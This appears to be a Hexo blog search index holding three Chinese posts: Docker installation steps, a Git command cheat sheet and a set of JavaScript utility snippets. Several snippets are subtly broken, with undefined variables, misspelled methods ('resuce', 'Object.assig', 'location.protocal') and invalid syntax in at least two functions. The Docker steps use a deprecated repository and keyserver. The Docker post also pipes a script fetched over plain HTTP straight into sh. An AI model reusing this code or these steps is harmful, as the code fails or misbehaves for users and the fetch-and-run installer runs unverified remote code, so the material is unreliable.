<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Docker安装</title>
    <url>/20200908/075321.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>记录一下在云服务器上安装Docker过程。</p>
</blockquote>
<a id="more"></a>

<h5 id="1-选择国内的云服务商，这里选择阿里云为例"><a href="#1-选择国内的云服务商，这里选择阿里云为例" class="headerlink" title="1.选择国内的云服务商，这里选择阿里云为例"></a>1.选择国内的云服务商，这里选择阿里云为例</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">curl -sSL http:<span class="comment">//acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh -</span></span><br></pre></td></tr></table></figure>
<h5 id="2-安装所需要的包"><a href="#2-安装所需要的包" class="headerlink" title="2.安装所需要的包"></a>2.安装所需要的包</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo apt-get install linux-image-extra-$(uname -r) linux-image-extra-virtual</span><br></pre></td></tr></table></figure>

<h5 id="3-添加使用-HTTPS-传输的软件包以及-CA-证书"><a href="#3-添加使用-HTTPS-传输的软件包以及-CA-证书" class="headerlink" title="3.添加使用 HTTPS 传输的软件包以及 CA 证书"></a>3.添加使用 HTTPS 传输的软件包以及 CA 证书</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo apt-get update sudo apt-get install apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>

<h5 id="4-添加GPG密钥"><a href="#4-添加GPG密钥" class="headerlink" title="4.添加GPG密钥"></a>4.添加GPG密钥</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo apt-key adv --keyserver hkp:<span class="comment">//p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span></span><br></pre></td></tr></table></figure>

<h5 id="5-添加软件源"><a href="#5-添加软件源" class="headerlink" title="5.添加软件源"></a>5.添加软件源</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;deb https://apt.dockerproject.org/repo ubuntu-xenial main&quot;</span> | sudo tee /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<h5 id="6-添加成功后更新软件包缓存"><a href="#6-添加成功后更新软件包缓存" class="headerlink" title="6.添加成功后更新软件包缓存"></a>6.添加成功后更新软件包缓存</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<h5 id="7-安装docker"><a href="#7-安装docker" class="headerlink" title="7.安装docker"></a>7.安装docker</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-engine</span><br></pre></td></tr></table></figure>

<h5 id="8-启动-docker"><a href="#8-启动-docker" class="headerlink" title="8.启动 docker"></a>8.启动 docker</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable docker sudo systemctl start docker</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>部署运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>部署</tag>
      </tags>
  </entry>
  <entry>
    <title>Git使用总结</title>
    <url>/20200907/035321.html</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
<p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目，在这里做一下Git使用的总结。</p>
</blockquote>
<a id="more"></a>

<h4 id="1、文档查询"><a href="#1、文档查询" class="headerlink" title="1、文档查询"></a>1、文档查询</h4><ul>
<li><code>git help (--help)</code>    一一 展示Git命令大纲</li>
<li><code>git help -a</code>    一一 展示Git命令大纲全部列表</li>
<li><code>git help &lt;command&gt;</code>    一一 展示具体命令说明手册</li>
</ul>
<h4 id="2、配置命令"><a href="#2、配置命令" class="headerlink" title="2、配置命令"></a>2、配置命令</h4><ul>
<li><code>git config list</code>    一一 列出当前配置</li>
<li><code>git config --local --list</code>    一一 列出仓库设置</li>
<li><code>git config --global --list</code>    一一 列出全局配置</li>
<li><code>git config --system --list</code>    一一 列出系统配置</li>
<li><code>git config --global user.name</code>    一一 配置用户名</li>
<li><code>git config  --global user.email</code>    一一 配置用户邮箱</li>
</ul>
<h4 id="3、分支管理"><a href="#3、分支管理" class="headerlink" title="3、分支管理"></a>3、分支管理</h4><ul>
<li><code>git branch</code>    一一 查看本地分支</li>
<li><code>git branch -r</code>    一一 查看远程分支</li>
<li><code>git branch -a</code>    一一 查看本地和远程分支</li>
<li><code>git checkout &lt;branch-name&gt;</code>    一一 从当前分支切换到其他分支</li>
<li><code>git checkout -b &lt;branch-name&gt;</code>    一一 创建并切换到新建分支</li>
<li><code>git branch -d &lt;branch-name&gt;</code>    一一 删除分支</li>
<li><code>git merge &lt;branch-name&gt;</code>    一一 当前分支与指定分支合并</li>
<li><code>git branch --merged</code>    一一 查看哪些分支已经合并到当前分支</li>
<li><code>git branch --no-merged</code>    一一 查看哪些分支没有合并到当前分支</li>
<li><code>git branch -v</code>    一一 查看各个分支最后一个提交对象的信息</li>
<li><code>git push origin --d &lt;branch-name&gt;</code>    一一 删除远程分支</li>
<li><code>git branch -m &lt;oldbranch-name&gt;&lt;newbranch-name&gt;</code>    一一 重命名分支</li>
<li><code>git checkout -b 本地分支名x origin/远程分支名x</code>    一一 拉取远程分支并创建本地分支</li>
</ul>
<h4 id="4、fetch指令"><a href="#4、fetch指令" class="headerlink" title="4、fetch指令"></a>4、fetch指令</h4><ul>
<li><code>git fetch &lt;远程主机名&gt;</code>    一一 将某个远程主机的更新，全部拉取回本地</li>
<li><code>git fetch &lt;远程主机名&gt; &lt;分支名&gt;</code>    一一 取回特定分支</li>
<li><code>git fetch origin &lt;remote-branch-name&gt; &lt;local-branch-name&gt;</code>    一一 取回特定分支，并拉取到本地分支</li>
</ul>
<h4 id="5、文件暂存"><a href="#5、文件暂存" class="headerlink" title="5、文件暂存"></a>5、文件暂存</h4><ul>
<li><code>git stash save -a &#39;message&#39;</code>    一一 添加改动到stash</li>
<li><code>git stash drop &lt;stash@[ID]</code>    一一 删除暂存</li>
<li><code>git stash list</code>    一一 查看stash列表</li>
<li><code>git stash clear</code>    一一 删除全部缓存</li>
<li><code>git stash pop &lt;stash@[ID]&gt;</code>    一一 恢复改动</li>
<li><code>git apply &lt;stash@[ID]&gt;</code>    一一 将某个暂存取出来并保存stash列表</li>
</ul>
<h4 id="6、撤销相关"><a href="#6、撤销相关" class="headerlink" title="6、撤销相关"></a>6、撤销相关</h4><ul>
<li><code>git checkout -- &lt;file&gt;</code>    一一 撤销“工作区”修改</li>
<li><code>git reset HEAD &lt;file&gt;</code>    一一 暂存区文件撤销(不覆盖工作区)</li>
<li><code>git reset --hard &lt;commit ID&gt;</code>    一一 版本回退</li>
</ul>
<h4 id="7、差异比较"><a href="#7、差异比较" class="headerlink" title="7、差异比较"></a>7、差异比较</h4><ul>
<li><code>git diff</code>    一一 比较工作区与缓存区</li>
<li><code>git diff --cached</code>    一一 比较缓存区与本地库最近一次commit内容</li>
<li><code>git diff HEAD</code>    一一 比较工作区与本地最近一次commit内容</li>
<li><code>git diff &lt;commit ID&gt; &lt;commit ID&gt;</code>    一一 比较两个commit之间的差异</li>
</ul>
<h4 id="8、Git文件状态"><a href="#8、Git文件状态" class="headerlink" title="8、Git文件状态"></a>8、Git文件状态</h4><p><code>git status</code>查看文件状态</p>
<ul>
<li><code>untracked</code>    在暂存区没有该文件</li>
<li><code>modified</code>      文件发生了修改</li>
</ul>
<h4 id="9、分支管理规范"><a href="#9、分支管理规范" class="headerlink" title="9、分支管理规范"></a>9、分支管理规范</h4><ul>
<li><code>master</code>分支<ul>
<li>主分支，用于部署生产环境的分支，确保稳定性。</li>
<li><code>master</code>分支一般由<code>develop</code>以及<code>hotfix</code>分支合并，任何情况下都不能直接修改代码</li>
</ul>
</li>
<li><code>develop</code>分支<ul>
<li><code>develop</code>为开发分支，通常情况下，保存最新完成及bug修复后的代码。</li>
<li>开发新功能时，<code>feature</code>分支都是基于<code>develop</code>分支下创建的。</li>
</ul>
</li>
<li><code>feature</code>分支<ul>
<li>开发新功能，基本上以<code>develop</code>为基础创建<code>feature</code>分支。</li>
<li>分支命名:<code>feature/</code>开头的为特性分支，命名规则:<code>feature/user_module</code>、<code>feature/cart_module</code>。</li>
</ul>
</li>
<li><code>release</code>分支<ul>
<li><code>release</code>分支为预上线分支，发布提测阶段，会以<code>release</code>分支代码为基准提测。</li>
</ul>
</li>
<li><code>hotfix</code>分支<ul>
<li>分支命名:<code>hotfix/</code>开头的为修复分支，命名规则与feature分支类似。</li>
<li>出现bug时，需要及时修复，以<code>master</code>分支为基线，创建<code>hotfix</code>分支，修复完成后，需要合并到<code>master</code>分支和<code>develop</code>分支。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>版本管理</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>版本管理</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript实用代码片段</title>
    <url>/20201016/094338.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>记录一些实用的Javascript代码片段。</p>
</blockquote>
<a id="more"></a>

<h5 id="隐藏所有指定元素"><a href="#隐藏所有指定元素" class="headerlink" title="隐藏所有指定元素"></a>隐藏所有指定元素</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> hideElement = <span class="function">(<span class="params">...ele</span>) =&gt;</span> [...ele].forEach(<span class="function"><span class="params">el</span> =&gt;</span> el.style.display = <span class="string">&#x27;none&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="判断元素是否具有指定的样式类"><a href="#判断元素是否具有指定的样式类" class="headerlink" title="判断元素是否具有指定的样式类"></a>判断元素是否具有指定的样式类</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> hasClass = <span class="function">(<span class="params">el, className</span>) =&gt;</span> el.classList.contains(className);</span><br></pre></td></tr></table></figure>

<h5 id="将数组转换为html标签列表"><a href="#将数组转换为html标签列表" class="headerlink" title="将数组转换为html标签列表"></a>将数组转换为html标签列表</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arrToHtml = <span class="function">(<span class="params">arr, id</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> htmlStr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    arr.forEach(<span class="function"><span class="params">item</span> =&gt;</span> str += <span class="string">`&lt;li&gt; <span class="subst">$&#123;item&#125;</span> &lt;/li&gt;`</span>)</span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#&#x27;</span> + id).innerHTML = htmlStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="获取当前URL"><a href="#获取当前URL" class="headerlink" title="获取当前URL"></a>获取当前URL</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getURL = <span class="function">() =&gt;</span> <span class="built_in">window</span>.location.href;</span><br></pre></td></tr></table></figure>

<h5 id="检测设备类型"><a href="#检测设备类型" class="headerlink" title="检测设备类型"></a>检测设备类型</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> detectDeviceType = <span class="function">() =&gt;</span> <span class="regexp">/Android|webOS|iPhone|iPad|BlackBerry|IEMobile|Opera Mini/i</span>.test(navigator.userAgent)? <span class="string">&#x27;Mobile&#x27;</span>:<span class="string">&#x27;Desktop&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h5 id="判断元素是否在可视窗口可见"><a href="#判断元素是否在可视窗口可见" class="headerlink" title="判断元素是否在可视窗口可见"></a>判断元素是否在可视窗口可见</h5><p>使用<code>Element.getBoundingClientRect()</code>和<code>window.inner(Width|Height)</code>值来确定给定元素是否在可视窗口可见，第二个参数<code>partiallyvisible</code>判断元素是否完全可见</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> elementIsVisibleInViewport = <span class="function">(<span class="params">el, partiallyVisible = <span class="literal">false</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; top, left, bottom, right &#125; = el.getBoundingClientRect();</span><br><span class="line">  <span class="keyword">const</span> &#123; innerHeight, innerWidth &#125; = <span class="built_in">window</span>;</span><br><span class="line">  <span class="keyword">return</span> partiallyVisible</span><br><span class="line">    ? ((top &gt; <span class="number">0</span> &amp;&amp; top &lt; innerHeight) || (bottom &gt; <span class="number">0</span> &amp;&amp; bottom &lt; innerHeight)) &amp;&amp;</span><br><span class="line">        ((left &gt; <span class="number">0</span> &amp;&amp; left &lt; innerWidth) || (right &gt; <span class="number">0</span> &amp;&amp; right &lt; innerWidth))</span><br><span class="line">    : top &gt;= <span class="number">0</span> &amp;&amp; left &gt;= <span class="number">0</span> &amp;&amp; bottom &lt;= innerHeight &amp;&amp; right &lt;= innerWidth;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="获取滚动条位置"><a href="#获取滚动条位置" class="headerlink" title="获取滚动条位置"></a>获取滚动条位置</h5><p>不传参数，默认值为<code>window</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getScrollPosition = <span class="function">(<span class="params">el = <span class="built_in">window</span></span>) =&gt;</span> (&#123;</span><br><span class="line">  x: el.pageXOffset !== <span class="literal">undefined</span> ? el.pageXOffset : el.scrollLeft,</span><br><span class="line">  y: el.pageYOffset !== <span class="literal">undefined</span> ? el.pageYOffset : el.scrollTop</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="获取元素样式"><a href="#获取元素样式" class="headerlink" title="获取元素样式"></a>获取元素样式</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getStyle = <span class="function">(<span class="params">el, prop</span>) =&gt;</span> getComputedStyle(el)[prop]</span><br></pre></td></tr></table></figure>

<h5 id="回到顶部"><a href="#回到顶部" class="headerlink" title="回到顶部"></a>回到顶部</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> scrollToTop = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> c = <span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop;</span><br><span class="line">  <span class="keyword">if</span> (c &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.requestAnimationFrame(scrollToTop);</span><br><span class="line">    <span class="built_in">window</span>.scrollTo(<span class="number">0</span>, c - c / <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="重定向到HTTPS"><a href="#重定向到HTTPS" class="headerlink" title="重定向到HTTPS"></a>重定向到HTTPS</h5><p><code>location.protocal</code>获取正在使用的协议，<code>location.replace</code>替换页面</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> redirecToHttps = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">if</span>(location.protocal !== <span class="string">&#x27;https:&#x27;</span>) location.replace(<span class="string">&#x27;https://&#x27;</span> + location.href.split(<span class="string">&#x27;//&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="获取两个日期之间相差的天数"><a href="#获取两个日期之间相差的天数" class="headerlink" title="获取两个日期之间相差的天数"></a>获取两个日期之间相差的天数</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getDaysDiffBetweenDates(dateInitial, dateFinal) =&gt; (dateFinal - dateInitial) / (<span class="number">1000</span> * <span class="number">3600</span> * <span class="number">24</span>);</span><br></pre></td></tr></table></figure>

<h5 id="以字符串形式返回明天日期表示"><a href="#以字符串形式返回明天日期表示" class="headerlink" title="以字符串形式返回明天日期表示"></a>以字符串形式返回明天日期表示</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getTomorrow = <span class="function">() =&gt;</span> <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() + <span class="number">86400000</span>).toISOString().split(<span class="string">&#x27;T&#x27;</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<h5 id="链式调用异步函数"><a href="#链式调用异步函数" class="headerlink" title="链式调用异步函数"></a>链式调用异步函数</h5><p>定义：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> chainAsync = <span class="function"><span class="params">fns</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> current = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> next = <span class="function">() =&gt;</span> fns[cur++](next)</span><br><span class="line">    next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">chainAsync([</span><br><span class="line">    next =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;0 second&#x27;</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(next, <span class="number">1000</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    next =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;1 second&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure>

<h5 id="休眠函数"><a href="#休眠函数" class="headerlink" title="休眠函数"></a>休眠函数</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sleep = <span class="function"><span class="params">sleepTime</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, sleepTime));</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">sleepWork</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;time to sleep 1 second&#x27;</span>);</span><br><span class="line">    <span class="keyword">await</span> sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;time to wake up&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="求一组数字的平均值"><a href="#求一组数字的平均值" class="headerlink" title="求一组数字的平均值"></a>求一组数字的平均值</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> average = <span class="function">(<span class="params">...nums</span>) =&gt;</span> [...nums].reduce(<span class="function">(<span class="params">cur,next</span>) =&gt;</span> cur + next, <span class="number">0</span>) / nums.length;</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">average(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<h5 id="将数字转化为整数数组"><a href="#将数字转化为整数数组" class="headerlink" title="将数字转化为整数数组"></a>将数字转化为整数数组</h5><p>将<code>123</code>转化为<code>[1,2,3]</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> digitize = <span class="function"><span class="params">n</span> =&gt;</span> [...<span class="string">`<span class="subst">$&#123;n&#125;</span>`</span>].map(<span class="function"><span class="params">i</span> =&gt;</span> <span class="built_in">parseInt</span>(i));</span><br></pre></td></tr></table></figure>

<h5 id="是否可以被某个数整除"><a href="#是否可以被某个数整除" class="headerlink" title="是否可以被某个数整除"></a>是否可以被某个数整除</h5><p>检查第一个数字是否可以被第二个数字整除</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isDivisible = <span class="function">(<span class="params">dividend, divisor</span>) =&gt;</span> dividend % divisor === <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h5 id="判断为偶数"><a href="#判断为偶数" class="headerlink" title="判断为偶数"></a>判断为偶数</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isEven = <span class="function"><span class="params">num</span> =&gt;</span> num % <span class="number">2</span> === <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h5 id="判断为素数"><a href="#判断为素数" class="headerlink" title="判断为素数"></a>判断为素数</h5><p>检查数字从<code>2</code>到给定数字的平方根，如果它们中的任何一个可以整除给定的数字，则返回<code>false</code>，否则返回<code>true</code>，除非数字小于<code>2</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isPrime = <span class="function"><span class="params">num</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> boundary = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.sqrt(num));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">2</span>; i &lt;= boundary; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(num % i == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num &gt;= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="获取数字数组的中值"><a href="#获取数字数组的中值" class="headerlink" title="获取数字数组的中值"></a>获取数字数组的中值</h5><p>找到数字数组的中间值，使用<code>Array.sort()</code>对值进行排序，如果<code>length</code>是奇数，则返回中间值数字，否则返回两个中间值数值的平均值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> median = <span class="function"><span class="params">arr</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> mid = <span class="built_in">Math</span>.floor(arr.length / <span class="number">2</span>),</span><br><span class="line">          nums = [...arr].sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">    <span class="keyword">return</span> arr.length % <span class="number">2</span> !==<span class="number">0</span> ? nums[mid] : (nums[mid - <span class="number">1</span>] + nums[mid]) / <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="生成指定范围内的一个随机整数"><a href="#生成指定范围内的一个随机整数" class="headerlink" title="生成指定范围内的一个随机整数"></a>生成指定范围内的一个随机整数</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getRandomIntegerFromRange = <span class="function">(<span class="params">min, max</span>) =&gt;</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (max - min + <span class="number">1</span>)) + min;</span><br></pre></td></tr></table></figure>

<h5 id="生成指定范围内的一个随机数"><a href="#生成指定范围内的一个随机数" class="headerlink" title="生成指定范围内的一个随机数"></a>生成指定范围内的一个随机数</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getRandomNumFromRange = <span class="function">(<span class="params">min, max</span>) =&gt;</span></span><br><span class="line"><span class="built_in">Math</span>.random() * (max - min) + min;</span><br></pre></td></tr></table></figure>

<h5 id="数字数组求和"><a href="#数字数组求和" class="headerlink" title="数字数组求和"></a>数字数组求和</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sum = <span class="function"><span class="params">arr</span> =&gt;</span> [...arr].resuce(<span class="function">(<span class="params">cur, next</span>) =&gt;</span> cur + next, <span class="number">0</span>)  </span><br></pre></td></tr></table></figure>

<h5 id="浅拷贝对象"><a href="#浅拷贝对象" class="headerlink" title="浅拷贝对象"></a>浅拷贝对象</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> shallowClone = <span class="function"><span class="params">obj</span> =&gt;</span> <span class="built_in">Object</span>.assig(&#123;&#125;,obj);</span><br></pre></td></tr></table></figure>

<h5 id="获取字符串的字节长度"><a href="#获取字符串的字节长度" class="headerlink" title="获取字符串的字节长度"></a>获取字符串的字节长度</h5><p>将字符串转换为<code>Blob</code>并查找其<code>size</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getByteSize = <span class="function"><span class="params">str</span> =&gt;</span> <span class="keyword">new</span> Blob(str).size();</span><br></pre></td></tr></table></figure>

<h5 id="字符串首字母大写"><a href="#字符串首字母大写" class="headerlink" title="字符串首字母大写"></a>字符串首字母大写</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> capitalize = <span class="function">(<span class="params">[firstLetter, ...rest]</span>) =&gt;</span> firstLetter.toUpperCase() + rest.join(<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="将每个单词的首字母设为大写"><a href="#将每个单词的首字母设为大写" class="headerlink" title="将每个单词的首字母设为大写"></a>将每个单词的首字母设为大写</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> capitalizeWord = <span class="function"><span class="params">str</span> =&gt;</span> str.replace(<span class="regexp">/\b[a-z]/g</span>, <span class="function"><span class="params">char</span> =&gt;</span> char.toUpperCase());</span><br></pre></td></tr></table></figure>

<h5 id="转换驼峰字符串并以指定分隔符分割"><a href="#转换驼峰字符串并以指定分隔符分割" class="headerlink" title="转换驼峰字符串并以指定分隔符分割"></a>转换驼峰字符串并以指定分隔符分割</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fromCamelCase = <span class="function">(<span class="params">str, separator = <span class="string">&#x27;_&#x27;</span></span>) =&gt;</span></span><br><span class="line">  str</span><br><span class="line">    .replace(<span class="regexp">/([a-z\d])([A-Z])/g</span>, <span class="string">&#x27;$1&#x27;</span> + separator + <span class="string">&#x27;$2&#x27;</span>)</span><br><span class="line">    .replace(<span class="regexp">/([A-Z]+)([A-Z][a-z\d]+)/g</span>, <span class="string">&#x27;$1&#x27;</span> + separator + <span class="string">&#x27;$2&#x27;</span>)</span><br><span class="line">    .toLowerCase();</span><br></pre></td></tr></table></figure>

<h5 id="判断是否为绝对地址"><a href="#判断是否为绝对地址" class="headerlink" title="判断是否为绝对地址"></a>判断是否为绝对地址</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isAbsoluteURL = <span class="function"><span class="params">str</span> =&gt;</span> <span class="regexp">/^[a-z][a-z0-9+.-]*:/</span>.test(str);</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">isAbsoluteURL(<span class="string">&#x27;https://www.baidu.com&#x27;</span>); <span class="comment">// true</span></span><br><span class="line">isAbsoluteURL(<span class="string">&#x27;/foo/bar&#x27;</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<h5 id="检查字符串是否小写"><a href="#检查字符串是否小写" class="headerlink" title="检查字符串是否小写"></a>检查字符串是否小写</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isLowerCase = <span class="function"><span class="params">str</span> =&gt;</span> str === str.toLowerCase()</span><br></pre></td></tr></table></figure>

<h5 id="检查字符串是否大写"><a href="#检查字符串是否大写" class="headerlink" title="检查字符串是否大写"></a>检查字符串是否大写</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> isUpperCase = <span class="function"><span class="params">str</span> =&gt;</span> str === str.toUpperCase()</span><br></pre></td></tr></table></figure>

<h5 id="使用-遮蔽字符串"><a href="#使用-遮蔽字符串" class="headerlink" title="使用*遮蔽字符串"></a>使用*遮蔽字符串</h5><p>用指定的掩码字符替换除最后 <code>num</code> 个字符以外的所有字符。</p>
<p>使用 <code>String.slice()</code> 获取需要被遮蔽的字符部分，并用正则表达式替换每个字符。 将遮蔽的字符与字符串的其余未遮蔽部分拼接起来。 省略第二个参数<code>num</code>，默认值为<code>4</code>，也就是说最后4个字符不被遮蔽。 如果<code>num</code>是负数，则不被遮蔽的字符将从字符串的开头算起。 省略第三个参数 <code>mask</code> ，默认使用字符<code>&#39;*&#39;</code>作为掩码遮蔽。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mask = <span class="function">(<span class="params">cc, num = <span class="number">4</span>, mask = <span class="string">&#x27;*&#x27;</span></span>) =&gt;</span></span><br><span class="line">  (<span class="string">&#x27;&#x27;</span> + cc).slice(<span class="number">0</span>, -num).replace(<span class="regexp">/./g</span>, mask) + (<span class="string">&#x27;&#x27;</span> + cc).slice(-num);</span><br></pre></td></tr></table></figure>

<h5 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> reverseStr = <span class="function"><span class="params">str</span> =&gt;</span> str.split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="按字母顺序排列字符串中的字符"><a href="#按字母顺序排列字符串中的字符" class="headerlink" title="按字母顺序排列字符串中的字符"></a>按字母顺序排列字符串中的字符</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sortCharByLetter = <span class="function"><span class="params">str</span> =&gt;</span> [...str].sort(a, b) =&gt; a.localeCompare(b)).join(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sortCharByLetter(<span class="string">&#x27;adfec&#x27;</span>) <span class="comment">// &#x27;acdef&#x27;</span></span><br></pre></td></tr></table></figure>

